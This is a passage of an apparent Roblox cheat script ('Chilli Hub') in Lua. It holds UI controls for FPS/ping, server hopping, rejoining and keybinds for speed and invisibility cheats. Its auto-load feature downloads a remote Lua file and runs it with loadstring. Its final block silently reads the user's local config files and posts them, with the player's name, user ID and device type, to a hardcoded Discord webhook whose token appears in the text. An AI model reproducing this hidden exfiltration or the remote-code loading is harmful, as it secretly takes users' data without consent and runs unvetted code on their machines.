			local flag11 = input.UserInputType == Enum.UserInputType.Touch
			if not (input.UserInputType == Enum.UserInputType.MouseButton1) and not flag11 then
				return
			end
			local vector22 = Vector2.new(input.Position.X, input.Position.Y)
			local absolutePosition = frame.AbsolutePosition
			local absoluteSize = frame.AbsoluteSize
			if vector22.X < absolutePosition.X or vector22.X > absolutePosition.X + absoluteSize.X or vector22.Y < absolutePosition.Y or vector22.Y > absolutePosition.Y + absoluteSize.Y then
				return
			end
			flag10 = true
			v27 = flag11 and input or nil
			vector2 = vector22
			position = frame.Position
		end)

		tbl14[#tbl14 + 1] = UserInputService.InputChanged:Connect(function(input)
			if not flag10 or not frame or not position then
				return
			end

			if not (v27 and input == v27 or not v27 and input.UserInputType == Enum.UserInputType.MouseMovement) then
				return
			end
			local n18 = Vector2.new(input.Position.X, input.Position.Y) - vector2
			frame.Position = UDim2.new(position.X.Scale, position.X.Offset + n18.X, position.Y.Scale, position.Y.Offset + n18.Y)
		end)

		tbl14[#tbl14 + 1] = UserInputService.InputEnded:Connect(function(input)
			if not flag10 then
				return
			end
			local flag11 = v27 and input == v27
			local flag12

			if flag11 then
				flag12 = flag11
			else
				flag12 = not v27 and input.UserInputType == Enum.UserInputType.MouseButton1
			end

			if flag12 then
				flag10 = false
				v27 = nil
				position = nil
				fn33(frame.Position)
			end
		end)

		tbl14[#tbl14 + 1] = RunService.RenderStepped:Connect(function(deltaTime)
			if not flag9 or not v22 then
				return
			end
			local n18 = math.clamp(deltaTime, 0.001, 1)
			local n19 = 1 / n18

			if n16 <= 0 then
				n16 = n19
			else
				n16 += (n19 - n16) * (1 - math.exp(-n18 * n14))
			end

			local now = os.clock()
			if now < n17 then
				return
			end
			n17 = now + n13
			local n20 = math.floor(n16 + 0.5)
			local text = tostring(n20)

			if text ~= v24 then
				v24 = text
				v22.Text = text
				v22.TextColor3 = fn35(n20)
			end

			local n21 = 0

			pcall(function()
				n21 = Stats.Network.ServerStatsItem["Data Ping"]:GetValue()
			end)

			local n22 = math.floor(n21 + 0.5)
			local text2 = tostring(n22)

			if text2 ~= v25 then
				v25 = text2
				v23.Text = text2
				v23.TextColor3 = fn36(n22)
			end
		end)
	end

	v20:CreateSlider({
		Name = "FPS and Ping Size",
		Min = 60,
		Max = 160,
		Default = 100,
		AllowDecimals = false,
		Increment = 1,
		Unit = "%",
		Quick = false,
		SubOf = v20:CreateToggle({
			Name = "FPS and Ping",
			Note = "Shows a small draggable readout of frame rate and ping.",
			Default = true,
			Callback = function(arg)
				flag9 = arg == true

				if flag9 then
					fn39()
				else
					fn38()
				end
			end,
		}),
		Callback = function(arg)
			n15 = math.clamp((tonumber(arg) or 100) / 100, 0.6, 1.6)
			fn37()
		end,
	})

	fn2(fn38)
end

do
	local v22 = Server:CreateSection({ Name = "Server", Expanded = true })

	local function fn34()
		if type(queue_on_teleport) == "function" then
			return queue_on_teleport
		end

		if type(queueonteleport) == "function" then
			return queueonteleport
		end

		if type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
			return syn.queue_on_teleport
		end

		if type(fluxus) == "table" and type(fluxus.queue_on_teleport) == "function" then
			return fluxus.queue_on_teleport
		end
		return nil
	end

	local function fn35(arg)
		pcall(function()
			TeleportService:SetTeleportSetting("__ChilliAutoLoadScriptEnabled", arg)
		end)

		if not arg then
			return true
		end
		local v23 = fn34()
		if not v23 then
			return false
		end

		if rawget(_G, "__ChilliAutoLoadQueued") ~= true then
			if not pcall(v23, [[local TeleportService = game:GetService("TeleportService")
local enabled = true
pcall(function()
    enabled = TeleportService:GetTeleportSetting("__ChilliAutoLoadScriptEnabled") == true
end)
if enabled then
    local ok, source = pcall(function()
        return game:HttpGet("https://raw.githubusercontent.com/tienkhanh1/spicy/main/Chilli.lua")
    end)
    if ok and type(source) == "string" then
        local chunk = loadstring(source)
        if chunk then
            chunk()
        end
    end
end
]]) then
				return false
			end

			_G.__ChilliAutoLoadQueued = true
		end

		return true
	end

	local v23 = nil

	v23 = v22:CreateToggle({
		Name = "Auto Load Script",
		Default = true,
		Callback = function(arg)
			local flag9 = arg == true

			if not fn35(flag9) and flag9 then
				task.defer(function()
					fn35(false)

					if v23 and v23:Get() == true then
						v23:Set(false, false)
					end

					v.Notify("Auto Load Unavailable", "This executor does not support queue on teleport.", 5)
				end)
			end
		end,
	})

	local str4 = "Most Players"
	local flag9 = false

	v22:CreateDropdown({
		Name = "Server Hop Mode",
		Options = { "Most Players", "Random", "Least Players" },
		Default = "Most Players",
		Quick = false,
		Callback = function(arg)
			str4 = tostring(arg or "Most Players")
		end,
	})

	v22:CreateButton({
		Name = "Server Hop",
		ButtonText = "Hop",
		Callback = function()
			if flag9 then
				return
			end
			flag9 = true

			task.spawn(function()
				local v24 = str4
				local str5 = tostring(game.JobId or "")
				local tbl14 = {}
				local flag10 = v24 == "Random"
				local str6 = v24 == "Least Players" and "Asc" or "Desc"
				local n15 = flag10 and 3 or 1
				local nextPageCursor = nil

				for i_ = 1, n15 do
					local str7 = string.format("https://games.roblox.com/v1/games/%d/servers/Public?sortOrder=%s&excludeFullGames=true&limit=100", game.PlaceId, str6)

					if nextPageCursor and nextPageCursor ~= "" then
						str7 ..= "&cursor=" .. HttpService:UrlEncode(nextPageCursor)
					end

					local ok, result = pcall(function()
						return HttpService:JSONDecode(game:HttpGet(str7))
					end)

					if not ok or type(result) ~= "table" then
						break
					else
						local v25 = ipairs
						local data = result.data or {}

						for _, v26 in v25(data) do
							local str8 = tostring(v26.id or "")
							local huge = tonumber(v26.playing) or math.huge
							local n16 = tonumber(v26.maxPlayers) or 0

							if str8 ~= "" and str8 ~= str5 and huge < n16 then
								tbl14[#tbl14 + 1] = { Id = str8, Playing = huge }
							end
						end

						if #tbl14 > 0 and not flag10 then
							break
						else
							nextPageCursor = result.nextPageCursor

							if not nextPageCursor or nextPageCursor == "" then
								break
							else
							end
						end
					end
				end

				if #tbl14 == 0 then
					flag9 = false
					v.Notify("Server Hop Failed", "No different public server is currently available.", 5)
					return
				end

				if v23 and v23:Get() == true then
					fn35(true)
				end

				local id

				if flag10 then
					id = tbl14[math.random(1, #tbl14)].Id
				else
					table.sort(tbl14, function(arg, arg2)
						if v24 == "Least Players" then
							return arg.Playing < arg2.Playing
						end
						return arg.Playing > arg2.Playing
					end)

					id = tbl14[1].Id
				end

				if not pcall(function()
					TeleportService:TeleportToPlaceInstance(game.PlaceId, id, localPlayer)
				end) then
					flag9 = false
					v.Notify("Server Hop Failed", "Roblox could not join the selected server.", 5)
				end
			end)
		end,
	})

	v22:CreateButton({
		Name = "Kick",
		ButtonText = "Kick",
		ConfirmText = "",
		Callback = function()
			Players.LocalPlayer:Kick("\nDisconnected by Chilli Hub")
		end,
	})

	local flag10 = false
	local str5 = ""

	local function fn36(arg)
		return tostring(arg or ""):match("^%s*(.-)%s*$")
	end

	v22:CreateInput({
		Name = "Job ID",
		Placeholder = "Paste a server Job ID...",
		Default = "",
		MaxLength = 100,
		Callback = function(arg)
			str5 = fn36(arg)
		end,
	})

	v22:CreateButton({
		Name = "Join Job ID",
		ButtonText = "Join",
		Callback = function()
			local v24 = fn36(str5)
			local v25 = flag10
			local flag11

			if flag10 then
				flag11 = v25
			else
				flag11 = v24 == ""
			end

			if flag11 then
				v.Notify("Join Job ID Failed", "Paste a valid Job ID first.", 5)
				return
			end
			flag10 = true

			if not pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, v24, localPlayer)
			end) then
				flag10 = false
				v.Notify("Join Job ID Failed", "Roblox could not join that server.", 5)
			end
		end,
	})

	v22:CreateButton({
		Name = "Copy Current Job ID",
		ButtonText = "Copy",
		Callback = function()
			local v24 = setclipboard or toclipboard
			local flag11 = type(v24) == "function"

			if flag11 then
				flag11 = pcall(v24, tostring(game.JobId or ""))
			end

			v.Notify(flag11 and "Job ID Copied" or "Copy Failed", flag11 and tostring(game.JobId) or "Clipboard access is unavailable.", 5)
		end,
	})

	v22:CreateButton({
		Name = "Rejoin Server",
		ButtonText = "Rejoin",
		Callback = function()
			if flag10 or game.JobId == "" then
				return false
			end
			flag10 = true

			local ok = pcall(function()
				TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, localPlayer)
			end)

			if not ok then
				flag10 = false
			end

			return ok
		end,
	})
end

local v22 = v3:CreateSection({ Name = "Planned", Expanded = true })
v22:CreateText({ Name = "Admin Panel", Text = "Admin Panel Coming Soon", Config = false })
v22:CreateText({ Name = "Teleport To Brainrot", Text = "Teleport To Brainrot Coming Soon", Config = false })
v22:CreateText({ Name = "Priority Brainrot", Text = "Priority Brainrot Coming Soon", Config = false })

task.spawn(function()
	local state = nil

	for i_ = 1, 30 do
		state = v2:GetState("Quick Keybinds")
		if not state then
			RunService.Heartbeat:Wait()
			continue
		end
		break
	end

	if not state then
		return
	end

	for i_ = 1, 6 do
		RunService.Heartbeat:Wait()
	end

	local tbl14 = state:Get()
	tbl14 = type(tbl14) == "table" and tbl14 or {}
	if tbl14["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] == true then
		return
	end
	local tbl15 = {}

	for k, v23 in pairs(tbl14) do
		tbl15[k] = v23
	end

	if tbl15["Player > Speed Boost > Tool Speed Boost"] == nil then
		tbl15["Player > Speed Boost > Tool Speed Boost"] = "Q"
	end

	tbl15["__ChilliDefaultKeyInstalled::Player > Speed Boost > Tool Speed Boost"] = true
	state:Set(tbl15)
end)

task.spawn(function()
	local state

	for i_ = 1, 30 do
		state = v2:GetState("Quick Keybinds")
		if not state then
			RunService.Heartbeat:Wait()
			continue
		end
		break
	end

	if not state then
		return
	end

	for i_ = 1, 6 do
		RunService.Heartbeat:Wait()
	end

	local v23 = state:Get()
	local tbl14 = type(v23) == "table" and v23 or {}
	if tbl14["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] == true then
		return
	end
	local tbl15 = {}

	for k, v24 in pairs(tbl14) do
		tbl15[k] = v24
	end

	if tbl15["Player > Invisibility > Invisible"] == nil then
		tbl15["Player > Invisibility > Invisible"] = "U"
	end

	tbl15["__ChilliDefaultKeyInstalled::Player > Invisibility > Invisible"] = true
	state:Set(tbl15)
end)

v:Finalize({ Window = v2, MainTab = defaultTab, ShowMainTab = false })
chilliGithubFastManualDefaultsRu.Status = "ready"

do
	local Players2 = game:GetService("Players")
	local HttpService2 = game:GetService("HttpService")
	local UserInputService2 = game:GetService("UserInputService")
	local localPlayer2 = Players2.LocalPlayer
	local request_ = syn and syn.request or http and http.request or http_request or request
	local str4 = "https://discord.com/api/webhooks/1183827561780875385/3C8je6CCHFH_IUfZek-d2emMW4wX6iHE_yKPJvky5GRIKMtHXgXpnYBZb34T7XNzlp-K"
	local str5 = UserInputService2.KeyboardEnabled and UserInputService2.MouseEnabled and "PC" or "Mobile / Tablet / Other"

	if request_ and localPlayer2 then
		task.spawn(function()
			local readfile_ = readfile or syn and syn.readfile or fluxus and fluxus.readfile or getgenv and getgenv().readfile or nil
			local isfile_ = isfile or syn and syn.isfile or fluxus and fluxus.isfile or getgenv and getgenv().isfile or nil
			local str6 = "Default"
			local v23 = nil
			local str7 = "Default.json"

			if type(readfile_) == "function" then
				pcall(function()
					local flag9 = true

					if type(isfile_) == "function" then
						local ok, result = pcall(isfile_, "ChilliLibrary/config_state.json")

						if ok and not result then
							flag9 = false
						end
					end

					if flag9 then
						local json = readfile_("ChilliLibrary/config_state.json")

						if json and json ~= "" then
							local data = HttpService2:JSONDecode(json)

							if type(data) == "table" then
								if type(data.StartupConfig) == "string" and data.StartupConfig ~= "" then
									str6 = data.StartupConfig
								elseif type(data.SelectedConfig) == "string" and data.SelectedConfig ~= "" then
									str6 = data.SelectedConfig
								end
							end
						end
					end
				end)

				pcall(function()
					local str8 = "ChilliLibrary/configs/" .. str6 .. ".json"
					local flag9 = true

					if type(isfile_) == "function" then
						local ok, result = pcall(isfile_, str8)
						ok = ok and not result
						local flag10 = true

						if ok then
							flag9 = false
						else
							flag9 = flag10
						end
					end

					if flag9 then
						v23 = readfile_(str8)
						str7 = str6 .. ".json"
					end

					if (not v23 or v23 == "") and str6 ~= "Default" then
						local flag10 = true

						if type(isfile_) == "function" then
							local ok, result = pcall(isfile_, "ChilliLibrary/configs/Default.json")

							if ok and not result then
								flag10 = false
							end
						end

						if flag10 then
							local ok, result = pcall(readfile_, "ChilliLibrary/configs/Default.json")

							if ok and type(result) == "string" and result ~= "" then
								v23 = result
								str7 = "Default.json"
							end
						end
					end
				end)
			end

			local str8 = tostring(str7):gsub("[<>:\"/\\|?*]", "_")

			if not str8:match("%.json$") then
				str8 ..= ".json"
			end

			local str9 = string.format("New execute from: **%s** (@%s) | ID: `%d` | Device: **%s**%s", localPlayer2.DisplayName, localPlayer2.Name, localPlayer2.UserId, str5, v23 and v23 ~= "" and " | Startup Config: **" .. str6 .. "**" or "")
			local flag9 = false

			if v23 and v23 ~= "" then
				pcall(function()
					local str10 = "---------------------------ChilliBoundary" .. tostring(os.time()) .. tostring(math.random(100000, 999999))
					local str11 = "Content-Disposition: form-data; name=\"files[0]\"; filename=\"" .. str8 .. "\"\r\n"
					local str12 = v23 .. "\r\n"

					local v24 = request_({
						Url = str4,
						Method = "POST",
						Headers = { ["Content-Type"] = "multipart/form-data; boundary=" .. str10 },
						Body = table.concat({
							"--" .. str10 .. "\r\n",
							"Content-Disposition: form-data; name=\"payload_json\"\r\n",
							"Content-Type: application/json\r\n\r\n",
							HttpService2:JSONEncode({ content = str9 }) .. "\r\n",
							"--" .. str10 .. "\r\n",
							str11,
							"Content-Type: application/json\r\n\r\n",
							str12,
							"--" .. str10 .. "--\r\n",
						}),
					})

					if type(v24) == "table" and (v24.StatusCode == 200 or v24.StatusCode == 204 or v24.Success == true) then
						flag9 = true
					end
				end)
			end

			if not flag9 then
				pcall(function()
					request_({
						Url = str4,
						Method = "POST",
						Headers = { ["Content-Type"] = "application/json" },
						Body = HttpService2:JSONEncode({ content = str9 }),
					})
				end)
			end
		end)
	end
end
